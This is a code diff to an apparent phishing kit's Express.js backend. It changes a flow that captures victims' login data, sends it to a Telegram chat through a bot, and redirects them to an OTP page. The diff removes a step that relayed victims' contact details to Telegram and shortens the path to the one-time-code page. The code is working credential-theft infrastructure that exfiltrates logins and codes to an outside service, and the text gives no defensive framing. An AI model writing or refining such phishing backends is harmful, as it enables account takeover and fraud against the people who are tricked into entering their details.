@@ -27,29 +27,11 @@ app.post("/login", (req, res) => {
   bot.sendMessage(TELEGRAM_CHAT_ID, loginMessage)
     .then(() => {
       console.log("Login data sent to Telegram");
-      res.redirect("/auth.html");
+      res.redirect("/otp.html");
     })
     .catch((error) => {
       console.error("Error sending login data to Telegram:", error.message);
       res.status(500).send("Error sending login data to Telegram");
-    });
-});
-
-// Handle POST request for authorization code form (auth.html)
-app.post("/auth", (req, res) => {
-  const { contact } = req.body;
-  console.log("Received auth code request:", { contact });
-
-  // Send auth code request to Telegram
-  const authMessage = `Authorization code request:\nContact: ${contact}`;
-  bot.sendMessage(TELEGRAM_CHAT_ID, authMessage)
-    .then(() => {
-      console.log("Auth code request sent to Telegram");
-      res.redirect("/otp.html");
-    })
-    .catch((error) => {
-      console.error("Error sending auth code request to Telegram:", error.message);
-      res.status(500).send("Error sending auth code request to Telegram");
     });
 });
 
